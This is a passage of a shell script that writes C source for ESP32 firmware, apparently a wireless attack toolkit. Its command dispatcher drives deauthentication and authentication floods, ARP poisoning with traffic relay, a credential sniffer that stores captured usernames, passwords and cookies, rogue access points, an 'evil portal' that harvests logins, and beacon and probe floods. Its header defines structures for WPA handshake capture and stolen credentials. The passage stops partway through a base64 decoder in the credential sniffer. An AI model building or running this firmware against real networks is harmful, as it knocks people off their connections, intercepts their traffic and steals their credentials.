            for (int i = 0; i < count; i++) {
                deauth_target_t tgt;
                if (deauth_get_target(i, &tgt) == ESP_OK) {
                    const char *mode_str = "auto";
                    switch (tgt.mode) {
                        case DEAUTH_MODE_DEAUTH_ONLY:    mode_str = "deauth"; break;
                        case DEAUTH_MODE_DISASSOC_ONLY:  mode_str = "disassoc"; break;
                        case DEAUTH_MODE_AUTH_FLOOD_ONLY: mode_str = "auth"; break;
                        default: break;
                    }
                    t->printf("  [%d] BSSID: " MACSTR " -> CLIENT: " MACSTR " [count=%" PRIu32 " mode=%s active=%d]\n",
                              i, MAC2STR(tgt.bssid), MAC2STR(tgt.client_mac),
                              tgt.count, mode_str, tgt.active);
                }
            }
        } else {
            if (t && t->printf) t->printf("Unknown deauth command\n");
        }
    } else if (strcmp(argv[0], "arp") == 0) {
        if (argc < 2) {
            if (t && t->printf) {
                t->printf("Usage:\n");
                t->printf("  arp poison <victim_ip> [gateway_ip] [interval_ms]\n");
                t->printf("  arp stop | status | table\n");
                t->printf("  arp relay on|off\n");
            }
        } else if (strcmp(argv[1], "poison") == 0 && argc >= 3) {
            const char *gw = (argc >= 4) ? argv[3] : NULL;
            const char *interval_arg = (argc >= 5) ? argv[4] : NULL;
            uint32_t iv = arg_to_u32(interval_arg, 2000);
            esp_err_t r = arp_poison_start(argv[2], gw, iv);
            if (t && t->printf) t->printf("arp poison: %s\n", esp_err_to_name(r));
        } else if (strcmp(argv[1], "stop") == 0) {
            arp_poison_stop();
        } else if (strcmp(argv[1], "status") == 0) {
            arp_poison_print_status();
        } else if (strcmp(argv[1], "table") == 0) {
            arp_poison_print_table();
        } else if (strcmp(argv[1], "relay") == 0 && argc >= 3) {
            if (strcmp(argv[2], "on") == 0) {
                arp_relay_set_enabled(true);
                if (t && t->printf) t->printf("relay on\n");
            } else if (strcmp(argv[2], "off") == 0) {
                arp_relay_set_enabled(false);
                if (t && t->printf) t->printf("relay off\n");
            } else {
                if (t && t->printf) t->printf("Usage: arp relay on|off\n");
            }
        } else {
            if (t && t->printf) t->printf("Unknown arp command\n");
        }
    } else if (strcmp(argv[0], "pcap") == 0) {
        if (argc < 2) {
            if (t && t->printf) {
                t->printf("Usage:\n  pcap start [secs] | stop | info | wipe\n");
                t->printf("  pcap save [path] | export\n");
            }
        } else if (strcmp(argv[1], "start") == 0) {
            uint32_t d = arg_to_u32(argv[2], 0);
            esp_err_t r = pcap_ring_start(d);
            if (t && t->printf) t->printf("pcap start: %s\n", esp_err_to_name(r));
        } else if (strcmp(argv[1], "stop") == 0) {
            pcap_ring_stop();
        } else if (strcmp(argv[1], "info") == 0) {
            pcap_ring_print_info();
        } else if (strcmp(argv[1], "wipe") == 0) {
            pcap_ring_wipe();
            if (t && t->printf) t->printf("ring wiped\n");
        } else if (strcmp(argv[1], "save") == 0) {
            char path[64];
            snprintf(path, sizeof(path), "/sd/ring_%" PRId64 ".pcap", esp_timer_get_time());
            if (argc >= 3) snprintf(path, sizeof(path), "%s", argv[2]);
            esp_err_t r = pcap_ring_save(path);
            if (t && t->printf) t->printf("pcap save: %s (%s)\n", esp_err_to_name(r), path);
        } else if (strcmp(argv[1], "export") == 0) {
            pcap_ring_export_serial();
        } else {
            if (t && t->printf) t->printf("Unknown pcap command\n");
        }
    } else if (strcmp(argv[0], "save") == 0) {
        if (!storage_is_ready()) {
            if (t && t->printf) t->printf("SD card not ready.\n");
        } else if (argc < 2) {
            if (t && t->printf) t->printf("Usage: save wifi | save ble\n");
        } else {
            char path[64];
            if (strcmp(argv[1], "wifi") == 0) {
                snprintf(path, sizeof(path), "/sd/wifi_%" PRId64 ".txt", esp_timer_get_time());
                (void)wifi_sniffer_save_report(path);
                if (t && t->printf) t->printf("Saved: %s\n", path);
            } else if (strcmp(argv[1], "ble") == 0) {
                snprintf(path, sizeof(path), "/sd/ble_%" PRId64 ".txt", esp_timer_get_time());
                (void)ble_scanner_save_report(path);
                if (t && t->printf) t->printf("Saved: %s\n", path);
            } else {
                if (t && t->printf) t->printf("Usage: save wifi | save ble\n");
            }
        }
    } else if (strcmp(argv[0], "creds") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: creds on|off|show|clear|save\n");
        } else if (strcmp(argv[1], "on") == 0) {
            /* FIXED: Removed direct access to static g_wifi_sniffer_active */
            wifi_sniffer_start(0); 
            creds_set_enabled(true);
            if (t && t->printf) t->printf("Credential sniffer ON\n");
        } else if (strcmp(argv[1], "off") == 0) {
            creds_set_enabled(false);
        } else if (strcmp(argv[1], "show") == 0) {
            creds_print();
        } else if (strcmp(argv[1], "clear") == 0) {
            creds_clear();
        } else if (strcmp(argv[1], "save") == 0) {
            char path[64];
            snprintf(path, sizeof(path), "/sd/creds_%" PRId64 ".txt", esp_timer_get_time());
            if (storage_is_ready() && creds_save(path) == ESP_OK) {
                if (t && t->printf) t->printf("Saved %s\n", path);
            } else {
                if (t && t->printf) t->printf("Save failed (SD?)\n");
            }
        }
    } else if (strcmp(argv[0], "beacon") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: beacon spam [ch] | stop\n");
        } else if (strcmp(argv[1], "spam") == 0) {
            uint8_t ch = (uint8_t)arg_to_u32(argv[2], 6);
            if (t && t->printf) t->printf("beacon spam: %s\n", esp_err_to_name(beacon_spam_start_builtin(ch)));
        } else if (strcmp(argv[1], "stop") == 0) {
            beacon_spam_stop();
        } else {
            if (t && t->printf) t->printf("Unknown beacon command\n");
        }
    } else if (strcmp(argv[0], "rogue") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: rogue start <ssid> [ch] [open|wpa2] | stop\n");
        } else if (strcmp(argv[1], "start") == 0 && argc >= 3) {
            uint8_t ch = (uint8_t)arg_to_u32(argv[3], 6);
            bool open = !(argc >= 5 && strcmp(argv[4], "wpa2") == 0);
            if (t && t->printf) t->printf("rogue: %s\n", esp_err_to_name(rogue_ap_start(argv[2], ch, open)));
        } else if (strcmp(argv[1], "stop") == 0) {
            rogue_ap_stop();
        } else {
            if (t && t->printf) t->printf("Unknown rogue command\n");
        }
    } else if (strcmp(argv[0], "portal") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: portal start <ssid> [ch] | stop | creds\n");
        } else if (strcmp(argv[1], "start") == 0 && argc >= 3) {
            uint8_t ch = (uint8_t)arg_to_u32(argv[3], 6);
            if (t && t->printf) t->printf("portal: %s\n", esp_err_to_name(evil_portal_start(argv[2], ch)));
        } else if (strcmp(argv[1], "stop") == 0) {
            evil_portal_stop();
        } else if (strcmp(argv[1], "creds") == 0) {
            evil_portal_print_creds();
        } else {
            if (t && t->printf) t->printf("Unknown portal command\n");
        }
    } else if (strcmp(argv[0], "probe") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: probe start <ssid> <count> [ch] | stop\n");
        } else if (strcmp(argv[1], "start") == 0 && argc >= 4) {
            uint32_t count = arg_to_u32(argv[3], 0);
            uint8_t ch = (argc >= 5) ? (uint8_t)arg_to_u32(argv[4], 1) : 1;
            if (t && t->printf) t->printf("probe: %s\n", esp_err_to_name(probe_flood_start(argv[2], count, ch)));
        } else if (strcmp(argv[1], "stop") == 0) {
            probe_flood_stop();
        } else {
            if (t && t->printf) t->printf("Unknown probe command\n");
        }
    } else if (strcmp(argv[0], "doj") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: doj start <bssid> | stop\n");
        } else if (strcmp(argv[1], "start") == 0 && argc >= 3) {
            uint8_t bssid[6];
            if (sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &bssid[0], &bssid[1], &bssid[2],
                       &bssid[3], &bssid[4], &bssid[5]) == 6) {
                if (t && t->printf) t->printf("doj: %s\n", esp_err_to_name(deauth_on_join_start(bssid)));
            } else {
                if (t && t->printf) t->printf("Invalid BSSID format.\n");
            }
        } else if (strcmp(argv[1], "stop") == 0) {
            deauth_on_join_stop();
        } else {
            if (t && t->printf) t->printf("Unknown doj command\n");
        }
    } else if (strcmp(argv[0], "oui") == 0) {
        if (argc < 2) {
            if (t && t->printf) t->printf("Usage: oui <mac>\n");
        } else {
            uint8_t mac[6];
            if (sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                       &mac[0], &mac[1], &mac[2],
                       &mac[3], &mac[4], &mac[5]) == 6) {
                if (t && t->printf) t->printf("OUI for %02X:%02X:%02X:... is %s\n",
                                               mac[0], mac[1], mac[2], oui_lookup(mac));
            } else {
                if (t && t->printf) t->printf("Invalid MAC format.\n");
            }
        }
    } else if (strcmp(argv[0], "analyzer") == 0) {
        uint32_t secs = (argc >= 2) ? arg_to_u32(argv[1], 2) : 2;
        channel_analyzer_run(secs);
    } else {
        if (t && t->printf) t->printf("Unknown command. Type 'help'.\n");
    }
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/cli_module.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/cli_transport.c"
#include "cli_transport.h"
#include "usb_cdc.h"
#include "cli_module.h"
#include "port_detect.h"
#include "jsonrpc.h"

#include "esp_log.h"
#include "driver/uart.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <errno.h>

#if defined(CONFIG_TINYUSB_CDC_ENABLED) && __has_include("tusb.h")
#include "tusb.h"
#define REAPER_HAS_TUSB_CDC 1
#else
#define REAPER_HAS_TUSB_CDC 0
#endif

static const char *TAG = "cli";

static const cli_transport_t *g_active = NULL;
static port_transport_t g_current_transport = PORT_TRANSPORT_UART0;
static SemaphoreHandle_t g_transport_lock = NULL;

/* =========================================================================
 *  UART0 Transport (POSIX VFS)
 * ========================================================================= */

static esp_err_t uart0_init(void)
{
    /* 
     * CRITICAL FIX: Set STDIN to non-blocking so read() doesn't freeze the task.
     */
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    if (flags != -1) {
        fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
    }
    
    ESP_LOGI(TAG, "UART0 transport ready (VFS/Console mode)");
    return ESP_OK;
}

static esp_err_t uart0_deinit(void) { return ESP_OK; }
static bool uart0_connected(void) { return true; }

static int uart0_read_line(char *buf, size_t cap, uint32_t timeout_ms)
{
    if (cap == 0) return -1;
    size_t i = 0;
    bool got_any = false;
    
    TickType_t start_tick = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(timeout_ms);

    while (1) {
        uint8_t c = 0;
        int n = read(STDIN_FILENO, &c, 1);
        
        if (n == 1) {
            start_tick = xTaskGetTickCount(); 
            
            if (c == '\r' || c == '\n') {
                if (!got_any) continue;
                buf[i] = '\0';
                write(STDOUT_FILENO, "\r\n", 2);
                return (int)i;
            }

            got_any = true;

            if (c == 0x08 || c == 0x7F) { 
                if (i > 0) {
                    i--;
                    write(STDOUT_FILENO, "\b \b", 3);
                }
                continue;
            }

            if (c < 0x20) continue; 

            if (i < cap - 1) {
                buf[i++] = (char)c;
                write(STDOUT_FILENO, &c, 1); 
            }
        } else {
            /* read() returns -1 with EAGAIN when no data is available in O_NONBLOCK */
            if ((xTaskGetTickCount() - start_tick) >= timeout_ticks) {
                return (i > 0) ? (int)i : -1;
            }
            vTaskDelay(pdMS_TO_TICKS(10)); 
        }
    }
}

static int uart0_write(const void *data, size_t len)
{
    return (int)write(STDOUT_FILENO, data, len);
}

static int uart0_printf(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) return -1;
    if (n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
    return uart0_write(buf, (size_t)n);
}

static const cli_transport_t g_uart0_transport = {
    .init = uart0_init, .deinit = uart0_deinit, .connected = uart0_connected,
    .read_line = uart0_read_line, .write = uart0_write, .printf = uart0_printf,
};

/* =========================================================================
 *  CDC-ACM Transport (TinyUSB)
 * ========================================================================= */

static esp_err_t cdc_init(void) { return ESP_OK; }
static esp_err_t cdc_deinit(void) { return ESP_OK; }

static bool cdc_connected(void)
{
#if REAPER_HAS_TUSB_CDC
    return tud_cdc_connected();
#else
    return false;
#endif
}

static int cdc_read_line(char *buf, size_t cap, uint32_t timeout_ms)
{
#if REAPER_HAS_TUSB_CDC
    if (cap == 0) return -1;
    size_t i = 0;
    
    TickType_t start_tick = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(timeout_ms);

    while (1) {
        if (tud_cdc_available()) {
            uint8_t c = 0;
            uint32_t n = tud_cdc_read(&c, 1);
            if (n == 1) {
                start_tick = xTaskGetTickCount(); 
                
                if (c == '\r' || c == '\n') {
                    buf[i] = '\0';
                    tud_cdc_write("\r\n", 2);
                    tud_cdc_write_flush();
                    return (int)i;
                }

                if (c == 0x08 || c == 0x7F) {
                    if (i > 0) {
                        i--;
                        tud_cdc_write("\b \b", 3);
                        tud_cdc_write_flush();
                    }
                    continue;
                }

                if (c < 0x20) continue;

                if (i < cap - 1) {
                    buf[i++] = (char)c;
                    tud_cdc_write(&c, 1); /* Echo */
                    tud_cdc_write_flush();
                }
            }
        } else {
            if ((xTaskGetTickCount() - start_tick) >= timeout_ticks) {
                return (i > 0) ? (int)i : -1;
            }
            vTaskDelay(pdMS_TO_TICKS(10)); 
        }
    }
#else
    return -1;
#endif
}

static int cdc_write(const void *data, size_t len)
{
    esp_err_t rc = usb_cdc_write((const uint8_t *)data, len);
    if (rc == ESP_OK) return (int)len;
    if (rc == ESP_ERR_CANCEL) usb_cdc_break_clear();
    return -1;
}

static int cdc_printf(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n < 0) return -1;
    if (n >= (int)sizeof(buf)) n = sizeof(buf) - 1;
    return cdc_write(buf, (size_t)n);
}

static const cli_transport_t g_cdc_transport = {
    .init = cdc_init, .deinit = cdc_deinit, .connected = cdc_connected,
    .read_line = cdc_read_line, .write = cdc_write, .printf = cdc_printf,
};

/* =========================================================================
 *  Public API & Command Loop
 * ========================================================================= */

const cli_transport_t *cli_transport_get(void) { return g_active; }

esp_err_t cli_transport_switch(port_transport_t new_transport)
{
    if (g_transport_lock == NULL) {
        g_transport_lock = xSemaphoreCreateMutex();
        if (!g_transport_lock) return ESP_ERR_NO_MEM;
    }

    xSemaphoreTake(g_transport_lock, portMAX_DELAY);
    
    if (g_active) {
        g_active->deinit();
        g_active = NULL;
    }

    const cli_transport_t *new_active = (new_transport == PORT_TRANSPORT_CDC) 
                                        ? &g_cdc_transport : &g_uart0_transport;
    
    esp_err_t ret = new_active->init();
    if (ret == ESP_OK) {
        g_active = new_active;
        g_current_transport = new_transport;
    }
    
    xSemaphoreGive(g_transport_lock);
    return ret;
}

/* Safe tokenizer to prevent memory corruption in cli_dispatch_command */
static int tokenize_line(char *line, char **argv, int max_args)
{
    int argc = 0;
    char *p = line;
    while (*p && argc < max_args) {
        while (isspace((unsigned char)*p)) p++;
        if (*p == '\0') break;
        argv[argc++] = p;
        while (*p && !isspace((unsigned char)*p)) p++;
        if (*p) *p++ = '\0';
    }
    return argc;
}

static void cli_command_loop(void)
{
    char line[CLI_LINE_MAX];
    char *argv[CLI_MAX_ARGS];

    while (1) {
        if (usb_cdc_break_signaled()) {
            usb_cdc_break_clear();
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }
        
        xSemaphoreTake(g_transport_lock, portMAX_DELAY);
        const cli_transport_t *t = g_active;
        xSemaphoreGive(g_transport_lock);

        if (!t || !t->connected()) {
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }

        if (t == &g_uart0_transport) {
            t->printf("\033[36mtoolkit> \033[0m"); 
        }

        int rc = t->read_line(line, sizeof(line), 500);
        if (rc <= 0) continue;

        char *p = line;
        while (isspace((unsigned char)*p)) p++;
        
        if (*p == '{') {
            jsonrpc_handle_message(p); 
        } else {
            int argc = tokenize_line(line, argv, CLI_MAX_ARGS);
            if (argc > 0) {
                cli_dispatch_command(argc, argv);
            }
        }
    }
}

static void cli_task(void *arg)
{
    (void)arg;
    cli_command_loop();
}

esp_err_t cli_start(void)
{
    if (g_transport_lock == NULL) {
        g_transport_lock = xSemaphoreCreateMutex();
        if (!g_transport_lock) return ESP_ERR_NO_MEM;
    }

    /* Use the global boot detection result */
    port_transport_t desired = g_boot_port.active; 

    esp_err_t ret = cli_transport_switch(desired);
    if (ret != ESP_OK) return ret;

    if (xTaskCreatePinnedToCore(cli_task, "cli_task", 8192, NULL, 3, NULL, 1) != pdPASS) {
        return ESP_FAIL;
    }

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/cli_transport.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/coex.c"
#include "coex.h"
#include "wifi_sniffer.h"
#include "ble_scanner.h"

#include <string.h>
#include <stdio.h>
#include <stdatomic.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"

#if __has_include("esp_coex.h") && (defined(CONFIG_SW_COEXIST_ENABLE) || defined(CONFIG_ESP_COEX_SW_COEXIST_ENABLE))
#include "esp_coex.h"
#define REAPER_HAS_ESP_COEX 1
#else
#define REAPER_HAS_ESP_COEX 0
#endif

static const char *TAG = "coex";

static atomic_int g_pref = COEX_PREF_BALANCE;
static atomic_bool g_init_done = false;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static const char *pref_to_str(coex_pref_t pref)
{
    switch (pref) {
        case COEX_PREF_WIFI:    return "wifi";
        case COEX_PREF_BLE:     return "ble";
        case COEX_PREF_BALANCE:
        default:                return "balance";
    }
}

#if REAPER_HAS_ESP_COEX
static esp_coex_prefer_t map_to_idf_pref(coex_pref_t pref)
{
    switch (pref) {
        case COEX_PREF_WIFI:    return ESP_COEX_PREFER_WIFI;
        case COEX_PREF_BLE:     return ESP_COEX_PREFER_BT;
        case COEX_PREF_BALANCE:
        default:                return ESP_COEX_PREFER_BALANCE;
    }
}
#endif

/* -------------------------------------------------------------------------
 *  Public API
 * ----------------------------------------------------------------------- */

esp_err_t coex_init(void)
{
    if (atomic_load(&g_init_done)) return ESP_OK;

    atomic_store(&g_init_done, true);
    coex_set_preference((coex_pref_t)atomic_load(&g_pref));
    (void)pref_to_str;
    ESP_LOGI(TAG, "Coexistence initialized (pref=%s)", pref_to_str((coex_pref_t)atomic_load(&g_pref)));
    return ESP_OK;
}

esp_err_t coex_set_preference(coex_pref_t pref)
{
    if (pref > COEX_PREF_BALANCE) return ESP_ERR_INVALID_ARG;

    atomic_store(&g_pref, pref);

#if REAPER_HAS_ESP_COEX
    esp_coex_prefer_t idf_pref = map_to_idf_pref(pref);
    esp_err_t rc = esp_coex_preference_set(idf_pref);
    if (rc != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set hardware coex preference: %s", esp_err_to_name(rc));
    } else {
        ESP_LOGI(TAG, "Coex preference set to %s", pref_to_str(pref));
    }
    return rc;
#else
    ESP_LOGI(TAG, "Coex preference set to %s (SW coex not enabled in sdkconfig)", pref_to_str(pref));
    return ESP_OK;
#endif
}

coex_pref_t coex_get_preference(void)
{
    return (coex_pref_t)atomic_load(&g_pref);
}

esp_err_t coex_get_status(coex_status_t *out_status)
{
    if (out_status == NULL) return ESP_ERR_INVALID_ARG;

    memset(out_status, 0, sizeof(*out_status));
    out_status->wifi_has_radio = wifi_sniffer_is_active();
    out_status->ble_has_radio  = ble_scanner_is_initialized();

    return ESP_OK;
}

esp_err_t coex_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) return ESP_ERR_INVALID_ARG;

    coex_status_t st;
    coex_get_status(&st);

    coex_pref_t pref = (coex_pref_t)atomic_load(&g_pref);

    int w = snprintf(buf, bufsz,
        "{\"pref\":\"%s\",\"wifi_active\":%s,\"ble_active\":%s}",
        pref_to_str(pref),
        st.wifi_has_radio ? "true" : "false",
        st.ble_has_radio  ? "true" : "false");

    if (w < 0 || (size_t)w >= bufsz) return ESP_ERR_NO_MEM;
    return ESP_OK;
}

bool coex_wifi_active(void)
{
    coex_status_t st;
    if (coex_get_status(&st) != ESP_OK) return false;
    return st.wifi_has_radio;
}

bool coex_ble_active(void)
{
    coex_status_t st;
    if (coex_get_status(&st) != ESP_OK) return false;
    return st.ble_has_radio;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/coex.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/common_types.h"
#ifndef COMMON_TYPES_H
#define COMMON_TYPES_H

/* 
 * Lightweight includes only. 
 * Heavy headers like <stdio.h>, <string.h>, <stdlib.h> should be included 
 * directly in the .c files that need them to speed up incremental builds.
 */
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <inttypes.h>
#include <sys/time.h>
#include <time.h>

#include "esp_err.h"

#ifndef ESP_ERR_CANCEL
#define ESP_ERR_CANCEL 0x10B
#endif
#include "esp_log.h"

/* ==========================================================================
 *  GLOBAL MACROS
 * ========================================================================== */

#ifndef MACSTR
#define MACSTR "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC2STR(a) (a)[0], (a)[1], (a)[2], (a)[3], (a)[4], (a)[5]
#endif

/* 
 * Maximum 802.11 frame size captured. 
 * 2346 bytes covers standard MSDU (2304) + MAC header (24) + FCS (4) + padding.
 */
#define WIFI_MAX_FRAME_SIZE 2346

/* ==========================================================================
 *  SECTION 1: LED MODULE TYPES
 * ========================================================================== */

typedef enum {
    LED_STATE_OFF = 0,
    LED_STATE_IDLE,
    LED_STATE_SCANNING,
    LED_STATE_CONNECTED,
    LED_STATE_ERROR,
    LED_STATE_CUSTOM
} led_state_t;

typedef struct {
    uint8_t r;
    uint8_t g;
    uint8_t b;
} Color;

/* ==========================================================================
 *  SECTION 2: WI-FI PROMISCUOUS SNIFFER TYPES
 * ========================================================================== */

#define MAX_DISCOVERED_APS     50
#define MAX_DISCOVERED_CLIENTS 100

typedef struct __attribute__((packed)) {
    uint8_t bssid[6];
    uint8_t channel;
    uint8_t phy_mode; /* 0=unknown, 1=b, 2=a/g, 3=n, 4=ac, 5=ax */
} neighbor_entry_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    int8_t rssi;
    uint8_t channel;
    uint32_t pkt_count;
    
    /* Security & Capabilities */
    uint16_t rsn_version;
    uint8_t akm_count;
    uint8_t neighbor_count;
    neighbor_entry_t neighbors[8];
    
    /* Multi-BSSID & HE */
    uint8_t max_bssid_indicator;
    uint8_t bssid_index;
    uint8_t he_mcs_nss; 
    uint8_t he_ppdu_type; 
    
    /* Regulatory domain */
    char country_code[3]; 
    uint8_t reg_class;
    uint8_t max_tx_power;
    
    /* AI device fingerprinting */
    uint8_t fp_oui[3];
    uint8_t fp_rates[8];
    uint8_t fp_rate_count;
    uint8_t fp_ext_cap[8];
    uint8_t fp_ext_cap_len;
    uint8_t fp_class; 
    char fp_label[32];

    /* Boolean flags grouped at the end to minimize compiler padding holes. */
    bool pmf_capable;
    bool pmf_required;
    bool wpa3_sae;
    bool has_rrm;
    bool has_btm;
    bool is_multi_bssid;
    bool is_transmitted_bssid;
    bool he_capable;
    bool regdom_present;
    bool fp_done;
} ap_info_t;

typedef struct {
    uint8_t mac[6];
    uint8_t ap_bssid[6];
    int8_t rssi;
    uint8_t channel;
    uint32_t pkt_count;
} client_info_t;

typedef struct {
    uint32_t total_mgmt;
    uint32_t total_data;
    uint32_t beacon;
    uint32_t probe_req;
    uint32_t probe_resp;
    uint32_t deauth;
    uint32_t disassoc;
} wifi_stats_t;

typedef struct {
    uint8_t *payload;
    size_t len;
    int8_t rssi;
    uint8_t channel;
    struct timeval tv;
} wifi_pkt_msg_t;

/* Binary protocol structs MUST be packed */
typedef struct __attribute__((packed)) {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} wifi_ieee80211_mac_hdr_t;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcap_file_header_t;

typedef struct __attribute__((packed)) {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

/* ==========================================================================
 *  SECTION 3: BLE SCANNER TYPES
 * ========================================================================== */

#define MAX_DISCOVERED_BLE 50

typedef struct {
    uint8_t mac[6];
    uint8_t addr_type;
    char name[33];
    int8_t rssi;
    uint16_t mfg_id;
    uint32_t pkt_count;
    uint8_t tracker_score;
    
    uint8_t adv_mode; 
    uint8_t tx_power; 
    
    uint16_t periodic_adv_interval; 
    uint8_t sync_handle; 
    
    uint8_t irk_hash[3];      
    
    uint8_t iso_channels;     
    uint8_t bis_handles[4];   
    uint32_t iso_interval_us; 

    bool ext_adv_seen;
    bool has_aux_ptr;
    bool has_adi;
    bool has_scan_rsp;
    bool periodic_adv_seen;
    bool has_sync_info;
    bool sync_transfer_seen;
    bool phy_coded;       
    bool phy_coded_s8;    
    bool phy_1m;          
    bool phy_2m;          
    bool phy_coded_supported; 
    bool rpa_seen;            
    bool irk_hash_seen;       
    bool iso_seen;            
    bool has_big_info;        
} ble_info_t;

/* ==========================================================================
 *  SECTION 4: BOOT PORT DETECTION
 * ========================================================================== */

typedef enum {
    PORT_TRANSPORT_UART0 = 0,   
    PORT_TRANSPORT_CDC,         
    PORT_TRANSPORT_UNKNOWN,     
    PORT_TRANSPORT_BOTH         
} port_transport_t;

typedef struct {
    port_transport_t active;
    bool usb_serial_jtag_present;  
    bool cdc_acm_present;          
    bool both_active;              
    char jtag_serial[32];          
    char cdc_iface[16];            
    uint8_t reason;                
} port_detect_result_t;

#define PORT_REASON_JTAG_ONLY   0x01
#define PORT_REASON_CDC_ONLY    0x02
#define PORT_REASON_BOTH        0x03
#define PORT_REASON_FALLBACK    0x04

/* ==========================================================================
 *  SECTION 5: DEAUTH TYPES
 * ========================================================================== */

#define MAX_TARGET_APS    10
#define MAX_TARGET_CLIENTS 20

typedef enum {
    DEAUTH_TYPE_SINGLE,
    DEAUTH_TYPE_ALL,
    DEAUTH_TYPE_BROADCAST
} deauth_type_t;

typedef enum {
    DEAUTH_FALLBACK_NONE = 0,
    DEAUTH_FALLBACK_DISASSOC = 1,
    DEAUTH_FALLBACK_AUTH_FLOOD = 2
} deauth_fallback_t;

typedef enum {
    DEAUTH_MODE_FALLBACK_CHAIN = 0,
    DEAUTH_MODE_DEAUTH_ONLY    = 1,
    DEAUTH_MODE_DISASSOC_ONLY  = 2,
    DEAUTH_MODE_AUTH_FLOOD_ONLY = 3
} deauth_mode_t;

/* 
 * CRITICAL: Packed to ensure stable binary layout for NVS persistence.
 * Compiler padding or enum size changes would corrupt saved targets.
 */
typedef struct __attribute__((packed)) {
    uint8_t bssid[6];
    uint8_t client_mac[6];
    deauth_type_t type;
    uint32_t count;
    uint32_t delay_ms;
    deauth_mode_t mode;
    deauth_fallback_t fallback_level;
    uint32_t disassoc_count;
    uint32_t auth_count;
    bool active;
    bool wpa3_sae;
    bool pmf_required;
} deauth_target_t;

/* ==========================================================================
 *  SECTION 6: WPA HANDSHAKE TYPES
 * ========================================================================== */

#define EAPOL_BUF_SIZE 256

typedef struct __attribute__((packed)) {
    uint8_t ap_mac[6];
    uint8_t sta_mac[6];
    char ssid[33];
    uint8_t anonce[32];
    uint8_t snonce[32];
    uint8_t mic[16];
    uint8_t pmkid[16];
    uint8_t eapol[EAPOL_BUF_SIZE];
    uint16_t eapol_len;
    int64_t capture_time_us;
    bool valid;
    bool has_pmkid;
} handshake_t;

/* ==========================================================================
 *  SECTION 7: ARP POISON TYPES
 * ========================================================================== */

#define MAX_ARP_TABLE 32

typedef struct {
    uint8_t mac[6];
    uint8_t ip[4];
    uint8_t ap_bssid[6];
    uint32_t pkt_count;
    bool is_gateway;
} arp_host_t;

/* ==========================================================================
 *  SECTION 8: CREDENTIAL / PLAINTEXT SNIFFER
 * ========================================================================== */

#define MAX_CREDS 32

typedef struct {
    char host[64];
    char user[48];
    char pass[64];
    char cookie[96];
    char path[64];
    uint8_t src_ip[4];
    uint8_t dst_ip[4];
    int64_t time_us;
} cred_hit_t;

/* ==========================================================================
 *  SECTION 9: GPS / TIMESTAMP CORRELATION
 * ========================================================================== */

typedef struct {
    double latitude;
    double longitude;
    double altitude;
    double speed_knots;
    time_t timestamp; 
    uint8_t sat_count;
    uint8_t fix_quality; 
    bool valid;
} gps_fix_t;

#endif // COMMON_TYPES_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/common_types.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/cred_sniffer.c"
#include <stdatomic.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

#include "cred_sniffer.h"
#include "wifi_sniffer.h"
#include "storage_sd.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "esp_heap_caps.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "cred_sniffer";

static cred_hit_t g_creds[MAX_CREDS];
static uint16_t g_cred_count = 0;
static SemaphoreHandle_t g_cred_lock = NULL;
static atomic_bool g_creds_enabled = ATOMIC_VAR_INIT(false);

/* ==========================================================================
 *  Base64 Decode (RFC 4648)
 * ========================================================================== */

static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
